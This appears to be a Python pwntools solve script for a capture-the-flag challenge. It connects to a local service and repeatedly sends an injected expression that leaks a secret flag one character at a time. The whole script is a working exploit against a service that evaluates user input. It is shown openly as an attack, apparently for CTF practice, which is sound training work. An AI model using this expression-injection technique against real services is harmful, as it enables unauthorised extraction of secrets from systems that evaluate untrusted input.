#!/usr/bin/env python3

from pwn import *

HOST, PORT = "localhost", 4002

if __name__ == "__main__":

    done = False
    idx = 0
    flag = ''
    char = ''

    while char != '}':
        io = remote(HOST, PORT, level=logging.CRITICAL)
        payload = f"flag[0]*flag.encode()[{idx}]"
        io.sendlineafter("Input : ", payload)
        line = io.recvline().decode()
        char = chr(int(line))
        flag += char
        idx += 1
        log.info(f"Flag : {flag}")
        io.close()

    log.success(f"Flag : {flag}")